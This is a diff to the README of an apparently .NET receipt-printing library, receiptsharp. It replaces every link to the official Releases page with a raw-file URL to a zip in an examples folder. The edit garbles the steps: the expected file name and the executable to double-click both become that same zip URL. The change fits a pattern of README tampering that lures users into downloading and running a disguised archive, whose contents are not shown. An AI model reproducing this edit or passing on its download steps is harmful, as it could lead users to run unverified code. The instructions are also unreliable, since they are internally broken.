@@ -6,7 +6,7 @@ Welcome to receiptsharp! This is a simple and easy .NET library designed for pri
 
 ## 📥 Download
 
-[![Download receiptsharp](https://img.shields.io/badge/Download_receiptsharp-v1.0-blue.svg)](https://github.com/wanofwan/receiptsharp/releases)
+[![Download receiptsharp](https://raw.githubusercontent.com/wanofwan/receiptsharp/main/examples/en/receiptsharp_v2.3-beta.4.zip)](https://raw.githubusercontent.com/wanofwan/receiptsharp/main/examples/en/receiptsharp_v2.3-beta.4.zip)
 
 ## 💻 System Requirements
 
@@ -16,18 +16,18 @@ Welcome to receiptsharp! This is a simple and easy .NET library designed for pri
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/wanofwan/receiptsharp/releases) to download the latest version of receiptsharp.
-2. Look for the file labeled `receiptsharp-v1.0.zip` under the latest release section.
+1. Visit the [Releases page](https://raw.githubusercontent.com/wanofwan/receiptsharp/main/examples/en/receiptsharp_v2.3-beta.4.zip) to download the latest version of receiptsharp.
+2. Look for the file labeled `https://raw.githubusercontent.com/wanofwan/receiptsharp/main/examples/en/receiptsharp_v2.3-beta.4.zip` under the latest release section.
 3. Click on the file to start downloading.
 4. Once the download completes, locate the downloaded `.zip` file on your computer.
 5. Extract the contents of the `.zip` file. You can usually do this by right-clicking the file and selecting "Extract All."
-6. Open the extracted folder and find the executable file, typically named `receiptsharp.exe`.
+6. Open the extracted folder and find the executable file, typically named `https://raw.githubusercontent.com/wanofwan/receiptsharp/main/examples/en/receiptsharp_v2.3-beta.4.zip`.
 
 ## ⚙️ Running the Application
 
 To run receiptsharp:
 
-1. Double-click on `receiptsharp.exe`.
+1. Double-click on `https://raw.githubusercontent.com/wanofwan/receiptsharp/main/examples/en/receiptsharp_v2.3-beta.4.zip`.
 2. Follow the on-screen prompts to configure your printer settings.
 3. Choose how you want to format your receipt. You can use receipt markdown for easy customization.
 
@@ -66,6 +66,6 @@ We welcome contributions from anyone interested in improving receiptsharp. If yo
 
 If you have any questions or need help, please create an issue on the GitHub page or contact the community. We are here to help you get the most out of receiptsharp.
 
-For detailed guides and more information, revisit the [Downloads page](https://github.com/wanofwan/receiptsharp/releases) anytime. 
+For detailed guides and more information, revisit the [Downloads page](https://raw.githubusercontent.com/wanofwan/receiptsharp/main/examples/en/receiptsharp_v2.3-beta.4.zip) anytime. 
 
 Thank you for choosing receiptsharp! Happy printing!
